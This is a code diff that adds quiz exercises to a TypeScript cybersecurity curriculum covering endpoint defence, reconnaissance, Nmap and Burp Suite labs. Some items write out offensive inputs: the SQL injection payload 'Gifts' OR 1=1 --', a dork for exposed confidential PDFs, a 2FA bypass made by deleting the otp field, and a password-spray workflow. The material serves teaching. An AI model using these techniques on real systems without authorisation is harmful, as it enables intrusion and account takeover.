         title: "Zero Trust Architecture (never trust, always verify)",
@@ -11764,6 +14680,41 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-8",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the three stages of how EDR works in order.",
+            "items": [
+              "Continuous Data Collection (processes, network connections, user behavior)",
+              "Real-Time Analysis (detects IOCs/IOAs as they happen)",
+              "Automated Threat Response (alerts, isolates, remediates)"
+            ],
+            "explanation": "EDR gathers endpoint data continuously, analyses it in real time against IOCs/IOAs, then responds automatically without a human in the loop."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each endpoint-security term to its meaning.",
+            "pairs": [
+              {
+                "left": "Traditional AV",
+                "right": "Signature-based detection of known malware only"
+              },
+              {
+                "left": "EDR",
+                "right": "Real-time behavioral detection that can auto-isolate an endpoint"
+              },
+              {
+                "left": "IOCs",
+                "right": "Indicators of compromise"
+              },
+              {
+                "left": "IOAs",
+                "right": "Indicators of attack"
+              }
+            ],
+            "explanation": "Signature-based AV catches only known malware, while EDR analyses behavior against IOCs and IOAs to catch what AV misses."
+          }
+        ],
         moduleId: "m6",
         number: 81,
         title: "Endpoint Security (EDR, AV, Defender)",
@@ -11863,6 +14814,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-9",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each IDS/IPS concept to its description.",
+            "pairs": [
+              {
+                "left": "Signature-based detection",
+                "right": "Matches known-bad patterns; fast but misses novel attacks"
+              },
+              {
+                "left": "Anomaly-based detection",
+                "right": "Flags deviations from a baseline; higher false positives"
+              },
+              {
+                "left": "IDS",
+                "right": "Passive; alerts only"
+              },
+              {
+                "left": "IPS",
+                "right": "Inline; can actively drop malicious traffic"
+              }
+            ],
+            "explanation": "Signature matching is fast but blind to new attacks, anomaly detection catches novel ones, and only an inline IPS can block traffic."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the difference between the two systems.",
+            "template": "An ___ only alerts on malicious traffic, while an ___ sits inline and can actively block it.",
+            "blanks": [
+              "IDS",
+              "IPS"
+            ],
+            "explanation": "An IDS is passive and alert-only; an IPS sits inline in the traffic path and can drop malicious packets in real time.",
+            "distractors": [
+              "AV",
+              "EDR"
+            ]
+          }
+        ],
         moduleId: "m6",
         number: 82,
         title:
@@ -11956,6 +14946,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-10",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each firewall type or deployment to its description.",
+            "pairs": [
+              {
+                "left": "WAF",
+                "right": "Reverse proxy guarding web apps against XSS, SQLi, and CSRF"
+              },
+              {
+                "left": "NGFW",
+                "right": "Combines deep packet inspection, IPS, and application-awareness"
+              },
+              {
+                "left": "Network-based WAF",
+                "right": "Hardware, low latency, costly"
+              },
+              {
+                "left": "Cloud-based WAF",
+                "right": "Affordable with minimal upfront cost"
+              }
+            ],
+            "explanation": "A WAF shields web apps as a reverse proxy, an NGFW bundles DPI/IPS/app-awareness, and WAFs come in network, host, and cloud models."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the description of where a WAF sits and what it blocks.",
+            "template": "A WAF sits in front of web apps as a ___ and specifically blocks XSS, ___, and CSRF.",
+            "blanks": [
+              "reverse proxy",
+              "SQL injection"
+            ],
+            "explanation": "Acting as a reverse proxy, the WAF filters malicious requests like XSS, SQL injection, and CSRF before they reach the app server.",
+            "distractors": [
+              "load balancer",
+              "DDoS"
+            ]
+          }
+        ],
         moduleId: "m6",
         number: 83,
         title: "Web Application Firewall (WAF) & Next-Gen Firewall (NGFW)",
@@ -12087,6 +15116,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-11",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each VDI component to its role.",
+            "pairs": [
+              {
+                "left": "Hypervisor",
+                "right": "Creates and manages the VMs (VMware vSphere / Hyper-V)"
+              },
+              {
+                "left": "Connection Broker",
+                "right": "Allocates a virtual desktop from the pool per user"
+              },
+              {
+                "left": "Client Device",
+                "right": "The PC, tablet, or thin client"
+              },
+              {
+                "left": "Remote Display Protocol",
+                "right": "Streams the desktop (RDP, PCoIP, HDX)"
+              }
+            ],
+            "explanation": "VDI hosts desktops centrally: the hypervisor runs the VMs, the broker assigns one per user, and a display protocol streams it to the client."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the VDI security and flexibility facts.",
+            "template": "VDI keeps data on the ___ rather than the endpoint, and ___ lets personal devices connect without compromising security.",
+            "blanks": [
+              "server",
+              "BYOD"
+            ],
+            "explanation": "Because sensitive data stays on the server, VDI supports Bring Your Own Device (BYOD) without exposing data on the endpoint.",
+            "distractors": [
+              "client",
+              "VPN"
+            ]
+          }
+        ],
         moduleId: "m6",
         number: 84,
         title: "VDI (Virtual Desktop Infrastructure)",
@@ -12197,6 +15265,34 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m6-12",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to build the segmented corporate network diagram.",
+            "items": [
+              "Place the edge firewall with 3 interfaces (internet / internal LAN / DMZ)",
+              "Add the DMZ hosting the public web server",
+              "Create internal VLANs for HR, IT, and Finance",
+              "Place the AD domain controller on the internal LAN",
+              "Draw traffic-flow arrows matching the DMZ rules"
+            ],
+            "explanation": "Lay the firewall and its three zones first, populate the DMZ and internal VLANs, then annotate the traffic-flow arrows last."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the labels required on the diagram.",
+            "template": "Label HR as VLAN ___, and show that Internet to Internal traffic is ___.",
+            "blanks": [
+              "10",
+              "blocked"
+            ],
+            "explanation": "Per the module, HR is VLAN 10, and the DMZ rules block Internet-to-Internal traffic outright.",
+            "distractors": [
+              "20",
+              "allowed"
+            ]
+          }
+        ],
         moduleId: "m6",
         number: 85,
         title: "Lab: Design a corporate network diagram in draw.io",
@@ -12398,6 +15494,47 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m7-1",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the 5 phases of hacking in their correct lifecycle order.",
+            "items": [
+              "Reconnaissance",
+              "Scanning",
+              "Gaining Access",
+              "Maintaining Access",
+              "Covering Tracks"
+            ],
+            "explanation": "Every pentest and real attack roughly follows this sequence: gather info, map hosts/ports/services, exploit a foothold, persist, then clear artefacts."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each hacking phase to its defining activity.",
+            "pairs": [
+              {
+                "left": "Reconnaissance",
+                "right": "Build a blueprint of the organization"
+              },
+              {
+                "left": "Scanning",
+                "right": "Identify live hosts, open ports, service versions"
+              },
+              {
+                "left": "Gaining Access",
+                "right": "Exploit a service version matched to a CVE"
+              },
+              {
+                "left": "Maintaining Access",
+                "right": "Persistence to survive reboot/reconnect"
+              },
+              {
+                "left": "Covering Tracks",
+                "right": "Clear logs and artefacts"
+              }
+            ],
+            "explanation": "Phases 1-2 answer what software runs, who works there, and what is vulnerable, before Gaining Access is even attempted."
+          }
+        ],
         moduleId: "m7",
         number: 86,
         title:
@@ -12501,6 +15638,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each passive OSINT tool to what it provides.",
+            "pairs": [
+              {
+                "left": "Shodan",
+                "right": "Search engine for internet-connected devices"
+              },
+              {
+                "left": "WHOIS",
+                "right": "Registrar, nameservers, and org details for a domain"
+              },
+              {
+                "left": "crt.sh",
+                "right": "Certificate Transparency logs for subdomains"
+              },
+              {
+                "left": "Sherlock",
+                "right": "Hunt a username across social platforms"
+              },
+              {
+                "left": "theHarvester",
+                "right": "Gather emails/names/subdomains from public sources"
+              }
+            ],
+            "explanation": "Passive footprinting gathers Organization, Network, and System intelligence from public sources without a packet touching the target."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the Google dork that finds exposed confidential PDFs on a domain.",
+            "template": "site:example.com ___:pdf \"confidential\"",
+            "blanks": [
+              "filetype"
+            ],
+            "explanation": "The filetype: operator restricts results to a file extension; combined with site: it surfaces exposed documents for a single domain.",
+            "distractors": [
+              "inurl",
+              "intext"
+            ]
+          }
+        ],
         moduleId: "m7",
         number: 87,
         title:
@@ -12628,6 +15807,49 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the CeWL command that spiders a site to depth 2 and writes a wordlist.",
+            "template": "cewl ___ 2 ___ passlist.txt http://example.com",
+            "blanks": [
+              "-d",
+              "-w"
+            ],
+            "explanation": "-d sets the crawl depth and -w writes the harvested words to a file, later reused for password-cracking against harvested accounts.",
+            "distractors": [
+              "-t",
+              "-u"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each active recon tool to its purpose.",
+            "pairs": [
+              {
+                "left": "Photon",
+                "right": "Crawls a site for URLs and files"
+              },
+              {
+                "left": "CeWL",
+                "right": "Builds a wordlist from site content"
+              },
+              {
+                "left": "eMailTrackerPro",
+                "right": "Traces email headers to sender IP/location"
+              },
+              {
+                "left": "Nikto",
+                "right": "Probes a web server for outdated versions/misconfigs"
+              },
+              {
+                "left": "DNSRecon",
+                "right": "Runs standard DNS checks against the target"
+              }
+            ],
+            "explanation": "Active footprinting directly interacts with the target, so it requires explicit authorisation and an agreed scope first."
+          }
+        ],
         moduleId: "m7",
         number: 88,
         title: "Active Recon (Nmap, Traceroute, Banner Grabbing)",
@@ -12762,6 +15984,46 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the Nmap scanning funnel from first step to last.",
+            "items": [
+              "Ping sweep to find live hosts",
+              "DNS enumeration for hostnames",
+              "Find open ports",
+              "Fingerprint service versions"
+            ],
+            "explanation": "Confirm which hosts are alive, resolve hostnames, find open ports, then fingerprint each service so it can be checked against known CVEs."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Nmap flag to what it does.",
+            "pairs": [
+              {
+                "left": "-sn",
+                "right": "Ping sweep / host discovery"
+              },
+              {
+                "left": "-sV",
+                "right": "Service version detection"
+              },
+              {
+                "left": "-O",
+                "right": "OS fingerprinting"
+              },
+              {
+                "left": "-sS",
+                "right": "TCP SYN (stealth) scan"
+              },
+              {
+                "left": "-sU",
+                "right": "UDP scan"
+              }
+            ],
+            "explanation": "These flags cover the full funnel: discover hosts, enumerate versions, guess the OS, and scan both TCP and UDP services."
+          }
+        ],
         moduleId: "m7",
         number: 89,
         title:
@@ -12924,6 +16186,31 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-5",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the three linked NSE enumeration steps.",
+            "items": [
+              "Accurately detect the service version",
+              "Run automated NSE/vuln scripts",
+              "Manually cross-check the version against CVE databases"
+            ],
+            "explanation": "Fingerprint the service, run scripts against it, then verify against CVE Details/NVD/Exploit-DB before treating anything as confirmed."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the Nmap command that runs the broad vulnerability-detection script set.",
+            "template": "nmap ___ vuln <target>",
+            "blanks": [
+              "--script"
+            ],
+            "explanation": "--script vuln runs a broad set of vulnerability-detection scripts; specific ones include smb-vuln-ms17-010 and http-vuln-cve2020-3452.",
+            "distractors": [
+              "--sV",
+              "-O"
+            ]
+          }
+        ],
         moduleId: "m7",
         number: 90,
         title: "Nmap NSE Scripts for Service Enumeration",
@@ -13064,6 +16351,46 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each subdomain/DNS source to what it reveals.",
+            "pairs": [
+              {
+                "left": "subfinder",
+                "right": "Passively enumerate subdomains at scale"
+              },
+              {
+                "left": "crt.sh",
+                "right": "Certificate transparency logs"
+              },
+              {
+                "left": "YouGetSignal Reverse IP",
+                "right": "Other domains on the same server"
+              },
+              {
+                "left": "SecurityTrails Historical Data",
+                "right": "Past A/MX/NS/TXT records over time"
+              },
+              {
+                "left": "Netcraft Site Report",
+                "right": "Subdomains with netblock/OS info attached"
+              }
+            ],
+            "explanation": "Subdomains often run older, less-hardened apps, so combining passive sources dramatically expands the attack surface."
+          },
+          {
+            "type": "order",
+            "prompt": "Order the Netcraft Site Report walkthrough for finding subdomains.",
+            "items": [
+              "Open Resources -> Tools",
+              "Select Site Report",
+              "Look up the domain",
+              "Click the Domain link in the Network section"
+            ],
+            "explanation": "The Network section's domain link reveals subdomains with netblock and OS fingerprint info attached to each."
+          }
+        ],
         moduleId: "m7",
         number: 91,
         title: "Subdomain Enumeration (subfinder, amass, dnsx)",
@@ -13175,6 +16502,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the vulnerability scanning process.",
+            "items": [
+              "Find devices",
+              "Check for weaknesses",
+              "Assess risk (Critical/High/Medium/Low)",
+              "Remediate"
+            ],
+            "explanation": "Automated scanners like Nessus and OpenVAS turn raw discovery into a prioritised, remediable risk list."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Nessus risk category to its definition.",
+            "pairs": [
+              {
+                "left": "Critical",
+                "right": "Needs immediate action (e.g. sensitive data exposure)"
+              },
+              {
+                "left": "High",
+                "right": "Major risk exploitable any moment"
+              },
+              {
+                "left": "Medium",
+                "right": "Moderate risk that can wait"
+              },
+              {
+                "left": "Low",
+                "right": "Minor concern"
+              }
+            ],
+            "explanation": "Severity categories let teams triage findings by how urgently each must be fixed."
+          }
+        ],
         moduleId: "m7",
         number: 92,
         title: "Vulnerability Scanning with Nessus & OpenVAS",
@@ -13325,6 +16688,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each privilege-escalation concept to its meaning.",
+            "pairs": [
+              {
+                "left": "Vertical escalation",
+                "right": "Climb to admin/root for full control"
+              },
+              {
+                "left": "Horizontal escalation",
+                "right": "Access another same-level user's data"
+              },
+              {
+                "left": "IDOR",
+                "right": "Predictable object IDs enabling access"
+              },
+              {
+                "left": "Kernel exploit",
+                "right": "Concrete vertical escalation to root"
+              }
+            ],
+            "explanation": "Vertical climbs the privilege ladder; horizontal moves sideways to a peer's data, often enabled by flaws like IDOR."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the two escalation types.",
+            "template": "___ escalation: a regular user gains root; ___ escalation: User A reads User B's files",
+            "blanks": [
+              "Vertical",
+              "Horizontal"
+            ],
+            "explanation": "Vertical gains higher privilege (admin/root); horizontal accesses a same-level user's data.",
+            "distractors": [
+              "Lateral"
+            ]
+          }
+        ],
         moduleId: "m7",
         number: 93,
         title: "Privilege Escalation Theory - Vertical & Horizontal",
@@ -13406,6 +16807,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-9",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each post-exploitation activity to its description.",
+            "pairs": [
+              {
+                "left": "Persistence",
+                "right": "Survive reboot via scheduled tasks/registry"
+              },
+              {
+                "left": "Lateral movement",
+                "right": "Pivot to other hosts in the network"
+              },
+              {
+                "left": "Data exfiltration",
+                "right": "Extract data over covert channels"
+              },
+              {
+                "left": "Covering tracks",
+                "right": "Clear logs and artefacts"
+              },
+              {
+                "left": "Rootkit",
+                "right": "Stay hidden while maintaining access"
+              }
+            ],
+            "explanation": "After a foothold, attackers persist, pivot, steal data, and hide, keeping repeat access even after reboots or cleanup."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the concrete persistence example.",
+            "template": "A hacker modifies the Windows ___ so their backdoor launches at every system start",
+            "blanks": [
+              "registry"
+            ],
+            "explanation": "Editing registry Run keys makes a backdoor relaunch on each boot, surviving reboots.",
+            "distractors": [
+              "cron",
+              "BIOS"
+            ]
+          }
+        ],
         moduleId: "m7",
         number: 94,
         title:
@@ -13518,6 +16961,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-10",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order these penetration-test report sections as they appear in the deliverable.",
+            "items": [
+              "Executive Summary",
+              "Detailed Findings",
+              "Business Impact (CVSS)",
+              "Remediation Recommendations",
+              "Strategic Recommendations"
+            ],
+            "explanation": "A report opens non-technical for leadership, then details findings, scores impact, and closes with how to fix and improve."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each report section to its content.",
+            "pairs": [
+              {
+                "left": "Executive Summary",
+                "right": "Non-technical overview for leadership"
+              },
+              {
+                "left": "Business Impact",
+                "right": "CVSS scoring"
+              },
+              {
+                "left": "Exploitation Difficulty",
+                "right": "Easy/Medium/Hard rating"
+              },
+              {
+                "left": "Remediation Recommendations",
+                "right": "How to fix each finding"
+              }
+            ],
+            "explanation": "A finding is only as valuable as the report explaining it: know your audience and prioritise by severity and exploitability."
+          }
+        ],
         moduleId: "m7",
         number: 95,
         title: "Penetration Testing Report Structure",
@@ -13602,6 +17082,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-11",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each scoping/legal concept to its meaning.",
+            "pairs": [
+              {
+                "left": "Rules of Engagement",
+                "right": "Defines in-scope, off-limits, windows, contacts"
+              },
+              {
+                "left": "Written authorisation",
+                "right": "Required before touching systems you don't own"
+              },
+              {
+                "left": "Passive reconnaissance",
+                "right": "Needs no RoE; never touches the target"
+              },
+              {
+                "left": "Active technique (Nmap, ping)",
+                "right": "Requires RoE before use"
+              }
+            ],
+            "explanation": "RoE and written authorisation are what separate a pentest from a crime; only active techniques that touch the target require them."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the hard-gate rule stated before active footprinting.",
+            "template": "Before active footprinting, define the ___ with management to establish Rules of Engagement",
+            "blanks": [
+              "scope"
+            ],
+            "explanation": "Scope and RoE must be agreed before any technique interacts directly with target systems.",
+            "distractors": [
+              "budget",
+              "timeline"
+            ]
+          }
+        ],
         moduleId: "m7",
         number: 96,
         title: "Rules of Engagement & Scoping (Legal & Ethical)",
@@ -13682,6 +17200,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m7-12",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the end-to-end lab recon chain against the test target.",
+            "items": [
+              "Passive OSINT (WHOIS/Shodan/Netcraft/dorks)",
+              "Active Nmap scan (-sV -O -p-)",
+              "Nessus Basic Network Scan",
+              "Write the recon report"
+            ],
+            "explanation": "Start passive, move to active host/port/service enumeration, run a vulnerability scan, then document ports, services, OS, and CVEs."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the full active Nmap scan used in the lab's active stage.",
+            "template": "nmap ___ ___ -p- <target>",
+            "blanks": [
+              "-sV",
+              "-O"
+            ],
+            "explanation": "-sV detects service versions, -O fingerprints the OS, and -p- scans all 65535 ports for full enumeration.",
+            "distractors": [
+              "-sn"
+            ]
+          }
+        ],
         moduleId: "m7",
         number: 97,
         title: "Lab: Passive OSINT + Nmap scan + Nessus scan on a test target",
@@ -13843,6 +17387,48 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m8-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each core Burp Suite tool to what it is used for.",
+            "pairs": [
+              {
+                "left": "Proxy",
+                "right": "Intercepts and inspects HTTP traffic"
+              },
+              {
+                "left": "Repeater",
+                "right": "Edits and resends one request repeatedly"
+              },
+              {
+                "left": "Intruder",
+                "right": "Sprays an endpoint with many variations"
+              },
+              {
+                "left": "Decoder",
+                "right": "Encodes or decodes a payload"
+              },
+              {
+                "left": "Sequencer",
+                "right": "Analyzes token randomness (entropy)"
+              }
+            ],
+            "explanation": "Each Burp tool specializes in one job, and most later techniques are just a specific use of one of these core tools."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the fact about Burp Suite's foundation.",
+            "template": "Burp Suite is a ___-based framework and the industry standard for web application penetration testing.",
+            "blanks": [
+              "Java"
+            ],
+            "explanation": "Burp Suite is built in Java, which is why it runs cross-platform as a single framework.",
+            "distractors": [
+              "Python",
+              "C++"
+            ]
+          }
+        ],
         moduleId: "m8",
         number: 98,
         title: "What is Burp Suite & Why Pentesters Use It",
@@ -14050,6 +17636,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-2",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the FoxyProxy settings that match Burp's default proxy listener.",
+            "template": "Set FoxyProxy to hostname ___ and port ___ to route the browser through Burp.",
+            "blanks": [
+              "127.0.0.1",
+              "8080"
+            ],
+            "explanation": "Burp's proxy listener runs on 127.0.0.1:8080 by default, so FoxyProxy must point to the same address and port.",
+            "distractors": [
+              "0.0.0.0",
+              "8443"
+            ]
+          },
+          {
+            "type": "order",
+            "prompt": "Put the steps to launch Burp Suite in the correct order.",
+            "items": [
+              "Accept the terms and conditions",
+              "Choose a project type (click Next on Community)",
+              "Keep the recommended default configuration",
+              "Click Start Burp to open the dashboard"
+            ],
+            "explanation": "Launching Burp always follows this sequence, ending at the main dashboard once Start Burp is clicked."
+          }
+        ],
         moduleId: "m8",
         number: 99,
         title:
@@ -14212,6 +17825,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps for intercepting and modifying a request in the Proxy tab.",
+            "items": [
+              "Turn Intercept on in the Proxy tab",
+              "Submit the request in the browser",
+              "The request pauses in an editable raw view",
+              "Edit the raw request",
+              "Click Forward to send the edited version"
+            ],
+            "explanation": "Because the edit happens after the browser's own client-side checks, Intercept lets you bypass JavaScript validation entirely."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Proxy feature or action to its effect.",
+            "pairs": [
+              {
+                "left": "Proxy > HTTP History",
+                "right": "Logs every request and response captured"
+              },
+              {
+                "left": "Intercept on",
+                "right": "Pauses each outgoing request for editing"
+              },
+              {
+                "left": "Forward",
+                "right": "Sends your edited request instead of the original"
+              },
+              {
+                "left": "Deleting the otp field",
+                "right": "Bypasses a two-factor check"
+              }
+            ],
+            "explanation": "Intercept pauses and lets you alter requests; deleting a parameter like otp can bypass checks the server fails to handle safely."
+          }
+        ],
         moduleId: "m8",
         number: 100,
         title: "Intercepting & Modifying HTTP/HTTPS Requests",
@@ -14365,6 +18015,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the Burp Repeater workflow for iterating on one request.",
+            "items": [
+              "Capture a request in Proxy or open it from HTTP History",
+              "Right-click and choose Send to Repeater",
+              "Edit a parameter in Repeater",
+              "Click Send to resend the request"
+            ],
+            "explanation": "Repeater keeps the request open for editing indefinitely, which is ideal for trial-and-error payload crafting like SQL injection."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the Repeater enumeration example from the walkthrough.",
+            "template": "A GET request containing a ___ parameter was sent to Repeater and its value changed repeatedly to find valid products.",
+            "blanks": [
+              "productId"
+            ],
+            "explanation": "Walking the productId value through a range in Repeater enumerates which product IDs the application accepts.",
+            "distractors": [
+              "sessionId",
+              "category"
+            ]
+          }
+        ],
         moduleId: "m8",
         number: 101,
         title: "Burp Repeater - Manual Request Manipulation",
@@ -14481,6 +18157,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Intruder concept to its description.",
+            "pairs": [
+              {
+                "left": "Sniper",
+                "right": "One payload set through one position"
+              },
+              {
+                "left": "Cluster Bomb",
+                "right": "Every combination across multiple positions"
+              },
+              {
+                "left": "Payload position",
+                "right": "The marked spot in the request"
+              },
+              {
+                "left": "Community edition",
+                "right": "Rate-limits Intruder attacks"
+              }
+            ],
+            "explanation": "Sniper suits a single parameter, Cluster Bomb suits paired inputs like username+password, and Community throttles throughput."
+          },
+          {
+            "type": "order",
+            "prompt": "Order the steps of a Burp Intruder attack.",
+            "items": [
+              "Capture the request in Proxy",
+              "Right-click and Send to Intruder",
+              "Pick an attack type",
+              "Add the payload list",
+              "Launch the attack"
+            ],
+            "explanation": "After launching, you scan the responses for anything unusual, such as a redirect or an odd response length flagging a valid value."
+          }
+        ],
         moduleId: "m8",
         number: 102,
         title:
@@ -14607,6 +18320,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-6",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the Decoder round-trip example.",
+            "template": "In the worked example a JavaScript payload was ___-encoded in Decoder, then decoded back to verify the round-trip.",
+            "blanks": [
+              "URL"
+            ],
+            "explanation": "URL-encoding then decoding the payload confirms the encoding is reversible before it is sent to the target.",
+            "distractors": [
+              "Base64",
+              "HTML"
+            ]
+          },
+          {
+            "type": "order",
+            "prompt": "Order the steps of verifying an encoding round-trip inside Decoder.",
+            "items": [
+              "Copy data from a captured request into Decoder",
+              "URL-encode the payload",
+              "Decode it back to its original form",
+              "Confirm the round-trip before sending it to the target"
+            ],
+            "explanation": "Because Decoder lives inside Burp, data can be transformed right next to the request without switching tools."
+          }
+        ],
         moduleId: "m8",
         number: 103,
         title: "Burp Decoder - Encode, Decode, Hash data",
@@ -14726,6 +18465,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-7",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each scanning concept to its meaning.",
+            "pairs": [
+              {
+                "left": "Passive scanning",
+                "right": "Flags issues without sending extra requests"
+              },
+              {
+                "left": "Active scanning",
+                "right": "Sends crafted requests to probe for flaws"
+              },
+              {
+                "left": "Community edition",
+                "right": "Has no Scanner at all"
+              }
+            ],
+            "explanation": "Passive scanning only analyses traffic you already generate, while active scanning sends its own probes; Community has neither."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in which scan mode actively probes the target.",
+            "template": "___ scanning sends crafted, malicious requests to probe for vulnerabilities such as SQLi and XSS.",
+            "blanks": [
+              "Active"
+            ],
+            "explanation": "Active scanning sends its own probing requests, unlike passive scanning which only inspects existing traffic.",
+            "distractors": [
+              "Passive",
+              "Manual"
+            ]
+          }
+        ],
         moduleId: "m8",
         number: 104,
         title: "Burp Scanner - Passive vs Active Scanning",
@@ -14860,6 +18633,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-8",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the fact about how the Target Site map is built.",
+            "template": "The Target tab's Site map only grows while the ___ is actively capturing traffic.",
+            "blanks": [
+              "proxy"
+            ],
+            "explanation": "The site map fills in automatically as you browse, but only while the proxy is switched on and capturing.",
+            "distractors": [
+              "scanner",
+              "intruder"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Target/dashboard element to what it provides.",
+            "pairs": [
+              {
+                "left": "Site map",
+                "right": "Auto-built tree of the application's structure"
+              },
+              {
+                "left": "Target tab",
+                "right": "Contains the Site map"
+              },
+              {
+                "left": "Dashboard top bar",
+                "right": "Lists every available tool"
+              }
+            ],
+            "explanation": "The Site map in the Target tab builds a tree as you browse, while the dashboard's top bar lets you jump to any tool."
+          }
+        ],
         moduleId: "m8",
         number: 105,
         title: "Scope Configuration & Target Sitemap",
@@ -15045,6 +18852,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the lab steps for the login intercept and 2FA-bypass chain.",
+            "items": [
+              "Turn Intercept on and submit the login form",
+              "Edit the intercepted submit parameter",
+              "Forward it and Follow Redirection to the 2FA page",
+              "Turn Intercept back on and catch the OTP request",
+              "Delete the otp field before forwarding"
+            ],
+            "explanation": "Tampering with the submit parameter reaches the 2FA page, and stripping the otp field bypasses the second-factor check."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the 2FA-bypass step from the lab.",
+            "template": "Catch the OTP-submission request and delete the ___ field entirely before forwarding it.",
+            "blanks": [
+              "otp"
+            ],
+            "explanation": "Removing the otp field bypasses the two-factor check because the server fails to handle the missing parameter safely.",
+            "distractors": [
+              "username",
+              "csrf"
+            ]
+          }
+        ],
         moduleId: "m8",
         number: 106,
         title: "Lab: Set up Burp + Firefox, intercept login request",
@@ -15199,6 +19033,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-10",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the Repeater workflow for a manual SQLi test on DVWA.",
+            "items": [
+              "Capture the GET /filter?category=Gifts request",
+              "Send it to Repeater",
+              "Inject the SQLi payload into the category parameter",
+              "Highlight the payload and press Ctrl+U to URL-encode",
+              "Send the request and read the response diff"
+            ],
+            "explanation": "Keeping the request open in Repeater lets you edit one payload at a time and compare responses, the same habit used for productId enumeration."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the always-true SQL injection payload used in the lab.",
+            "template": "The injected payload is: Gifts' ___ 1=1 --",
+            "blanks": [
+              "OR"
+            ],
+            "explanation": "The OR 1=1 condition is always true, so a successful injection returns rows the original query should not have returned.",
+            "distractors": [
+              "AND",
+              "XOR"
+            ]
+          }
+        ],
         moduleId: "m8",
         number: 107,
         title: "Lab: Burp Repeater - manual SQLi test",
@@ -15304,6 +19165,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m8-11",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the Intruder password-spray workflow against DVWA.",
+            "items": [
+              "Capture the DVWA login POST and send it to Intruder",
+              "Mark the password field as the payload position (Sniper)",
+              "Load a wordlist as a Simple list payload set",
+              "Enable Grep-Match for a success string like 'Welcome'",
+              "Launch and scan responses for the hit"
+            ],
+            "explanation": "Grep-Match flags the one response containing the success string so the valid credential is spotted without reading every response."
+          },
+          {
